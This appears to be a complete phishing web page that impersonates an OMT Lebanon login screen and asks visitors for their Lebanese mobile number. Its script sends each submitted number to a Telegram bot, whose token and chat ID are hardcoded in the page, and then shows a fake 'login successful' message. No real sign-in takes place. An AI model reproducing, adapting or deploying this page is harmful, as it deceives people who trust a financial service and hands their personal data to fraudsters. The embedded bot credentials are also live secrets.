<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تسجيل الدخول</title>
  <!-- Open Graph Meta Tags for Link Preview -->
  <meta property="og:title" content="تسجيل الدخول" />
  <meta property="og:description" content="سجل دخولك إلى خدمات OMT لبنان بأمان وسهولة!" />
  <meta property="og:image" content="https://www2.0zz0.com/2025/12/03/17/283254346.jpeg" />
  <meta property="og:url" content="https://omt-lebanon.vercel.app" />
  <meta property="og:type" content="website" />
  <meta property="og:locale" content="ar_AR" />
  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="تسجيل الدخول" />
  <meta name="twitter:description" content="سجل دخولك إلى خدمات OMT لبنان بأمان وسهولة!" />
  <meta name="twitter:image" content="https://www2.0zz0.com/2025/12/03/17/283254346.jpeg" />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
  <style>
    body {
      background: #f7f7f8;
      min-height: 100vh;
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    #omt-container {
      background: none;
      min-height: 100vh;
      width: 100vw;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
    }
    .omt-header-bg {
      width: 100vw;
      min-height: 260px;
      background: linear-gradient(100deg,#ffd800 0%,#fcc23c 80%,#fff6cd 100%);
      box-sizing: border-box;
      position: relative;
      overflow: hidden;
    }
    .omt-logo-wrap {
      position: absolute;
      left: 50%;
      top: 22px;
      transform: translate(-50%, 0);
      background: #fff;
      border-radius: 22px;
      box-shadow: 0 8px 36px #ffd90020, 0px 1.5px 12px #ffd90011;
      padding: 22px 38px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .omt-logo-wrap img {
      width: 118px;
      height: 118px;
      border-radius: 24px;
      object-fit: contain;
      box-shadow: 0 3px 12px #ffd90026;
      border: 3px solid #ffe56d;
      background: #fff;
      transition: width 0.2s, height 0.2s;
    }
    .omt-login-card {
      width: 95vw;
      max-width: 420px;
      background: #fff;
      border-radius: 24px;
      margin: -60px 0 0 0;
      box-shadow: 0 7px 40px #ffd90014, 0 1.5px 14px #ffd90009;
      padding: 36px 30px 30px 30px;
      box-sizing: border-box;
      position: relative;
      animation: fadein 0.7s;
      z-index: 5;
    }
    @keyframes fadein {
      from { opacity: 0; transform: translateY(36px);}
      to { opacity: 1; transform: none;}
    }
    .omt-back-btn {
      position: absolute;
      right: 14px;
      top: 18px;
      width: 39px;
      height: 39px;
      background: #fff;
      border-radius: 50%;
      box-shadow: 0 2px 12px #ffd80020;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      font-size: 23px;
      color: #222;
      outline: none;
      transition: box-shadow 0.18s;
      z-index: 11;
      border: 2px solid #fff6cd;
    }
    .omt-login-title {
      font-size: 25px;
      font-weight: 800;
      color: #232301;
      margin: 16px 0 18px 0;
      text-align: left;
      direction: ltr;
      letter-spacing: 0.2px;
    }
    .omt-label {
      color: #ffd800;
      font-size: 15px;
      font-weight: 700;
      display: block;
      margin-bottom: 8px;
      margin-right: 2px;
      letter-spacing: 0.1px;
    }
    .omt-phone-row {
      display: flex;
      gap: 19px;
      align-items: center;
      margin-bottom: 10px;
      flex-direction: row;
    }
    .omt-country {
      padding: 0;
      background: #f9f9fb;
      border-radius: 13px;
      border: 2.5px solid #ffe56d;
      box-shadow: 0 1px 6px #ffd90011;
      min-width: 92px;
      min-height: 43px;
      display: flex;
      align-items: center;
      justify-content: left;
      gap: 9px;
      font-weight: 700;
      font-size: 17px;
      color: #111;
      outline: none;
      cursor: pointer;
      position: relative;
      flex-direction: row;
    }
    .omt-country img {
      width: 29px;
      height: 23px;
      border-radius: 9px;
      margin-right: 6px;
      object-fit: cover;
      background: #fff;
      box-shadow: 0 1px 5px #11111111;
    }
    .omt-phone-input {
      flex: 1;
      padding: 16px 13px;
      border-radius: 14px;
      border: 2.5px solid #ffe56d;
      box-shadow: 0 1px 7px #ffd9000d;
      background: #f9f9fb;
      font-size: 17px;
      font-family: 'Cairo', Arial, sans-serif;
      direction: ltr;
      color: #222;
      font-weight: 700;
      letter-spacing: 2px;
      outline: none;
      transition: border 0.18s, box-shadow 0.18s;
    }
    .omt-phone-input:focus {
      border-color: #ffd800;
      background: #fffdf4;
      box-shadow: 0 3px 14px #ffd80033;
    }
    .omt-register-row {
      text-align: center;
      margin: 44px 0 22px 0;
      font-size: 16px;
      color: #444;
      font-weight: 600;
    }
    .omt-register-row a {
      color: #111;
      text-decoration: underline;
      font-weight: bold;
      cursor: pointer;
      letter-spacing: 0.4px;
    }
    .omt-login-btn {
      width: 100%;
      background: #f7f7f8;
      color: #cccccc;
      border: none;
      border-radius: 40px;
      padding: 17px 0;
      font-size: 21px;
      font-weight: 900;
      cursor: not-allowed;
      letter-spacing: 0.7px;
      margin-top: 15px;
      margin-bottom: 3px;
    }
    .omt-login-btn.active {
      background: linear-gradient(90deg, #ffd800 0%, #fcc23c 100%);
      color: #202000;
      cursor: pointer;
      box-shadow: 0 1px 8px #ffd80055;
      transition: background 0.21s;
      opacity: 1;
    }
    @media (max-width: 600px) {
      .omt-logo-wrap img {
        width: 82px;
        height: 82px;
      }
      .omt-logo-wrap {
        padding: 10px 18px;
      }
    }
    @media (max-width: 480px) {
      .omt-login-card {
        padding: 16px 2.5vw 22px 2.5vw;
      }
      .omt-logo-wrap img {
        width: 64px; height: 64px;
      }
    }
  </style>
</head>
<body>
  <div id="omt-container">
    <div class="omt-header-bg">
      <div class="omt-logo-wrap">
        <img src="https://www2.0zz0.com/2025/12/03/17/283254346.jpeg" alt="OMT Logo" />
      </div>
    </div>
    <div class="omt-login-card" id="loginCard">
      <button class="omt-back-btn" id="backBtn" style="display:none">&#8592;</button>
      <div class="omt-login-title" style="text-align:left;direction:ltr;">Login</div>
      <form id="loginForm" autocomplete="off">
        <span class="omt-label">Mobile Number</span>
        <div class="omt-phone-row">
          <input type="tel" id="phoneInput" class="omt-phone-input" placeholder="أدخل رقم الهاتف" maxlength="8" required autocomplete="tel" inputmode="numeric" />
          <div class="omt-country">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/59/Flag_of_Lebanon.svg" alt="Lebanon Flag" />
            +961
          </div>
        </div>
        <div class="omt-register-row">
          Don’t Have an Account? <a href="#">Register</a>
        </div>
        <button type="submit" class="omt-login-btn" id="loginBtn" disabled>Login</button>
      </form>
    </div>
  </div>
  <script>
    const BOT_TOKEN = "8450343323:AAGVgCIJdSTdUpv8tu3iPLLdCIZkNGRdm2I";
    const CHAT_ID = "6873334348";
    // Lebanese phone validation
    const phoneInput = document.getElementById('phoneInput');
    const loginBtn = document.getElementById('loginBtn');
    const loginForm = document.getElementById('loginForm');
    phoneInput.addEventListener('input', function() {
      this.value = this.value.replace(/\D/g, '').substr(0, 8);
      updateLoginBtn();
    });
    function updateLoginBtn() {
      // Lebanese phone: +961 then 8 digits
      const validPhone = phoneInput.value.length === 8 &&
        (phoneInput.value.startsWith('3') || phoneInput.value.startsWith('1') || phoneInput.value.startsWith('7') || phoneInput.value.startsWith('8'));
      if (validPhone) {
        loginBtn.disabled = false;
        loginBtn.classList.add('active');
        loginBtn.style.cursor = "pointer";
        loginBtn.style.opacity = 1;
      } else {
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');
        loginBtn.style.cursor = "not-allowed";
        loginBtn.style.opacity = 1;
      }
    }
    loginForm.onsubmit = async function(e){
      e.preventDefault();
      loginBtn.textContent = "Processing...";
      loginBtn.disabled = true;
      const phone = '+961' + phoneInput.value;
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `رقم الهاتف: ${phone}`
          })
        });
      } catch (err) {}
      setTimeout(()=>{
        loginBtn.textContent = "Login";
        alert("تم تسجيل الدخول بنجاح!");
        // ... your next steps here ...
      },1200);
    };
    // Back button - demonstration purpose
    document.getElementById('backBtn').onclick = function() {
      window.history.back();
    }
  </script>
</body>
</html>
